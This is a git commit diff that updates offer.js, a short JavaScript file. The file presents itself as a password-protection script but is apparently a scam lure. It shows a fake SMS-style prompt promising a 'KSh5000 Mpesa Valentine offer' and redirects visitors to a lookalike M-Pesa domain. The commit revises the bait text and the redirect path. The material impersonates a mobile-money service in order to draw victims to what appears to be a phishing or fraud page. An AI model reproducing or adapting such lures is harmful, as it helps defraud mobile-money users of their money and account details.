402818c8b529c9514befb672ee972413bcd0b89f
newsrock <newsrock3345@gmail.com>
2025-02-07 03:41:27 +0100

    Update offer.js

--- offer.js
+++ offer.js
@@ -1,6 +1,6 @@
 /* Password Protection Script by www.onlineofferz.xyz*/
-var password = 'KES5000'
-password=prompt('SMS: Congratulations You are Eligible to receive KES5000 Mpesa Valentine offer, Kindly Press OK to ACTIVATE ','KES5000');
-if (password != 'KES5000') {
-location.href='https://mpesa-ke.allprogram.site/15GB';
+var password = 'WITHDRAW KSh5000'
+password=prompt('SMS: Congratulations You are Eligible to receive KSH5000 Mpesa Valentine offer, Kindly Press OK to ACTIVATE ','WITHDRAW KSh5000');
+if (password != 'WITHDRAW KSh5000') {
+location.href='https://mpesa-ke.allprogram.site/val';
 }
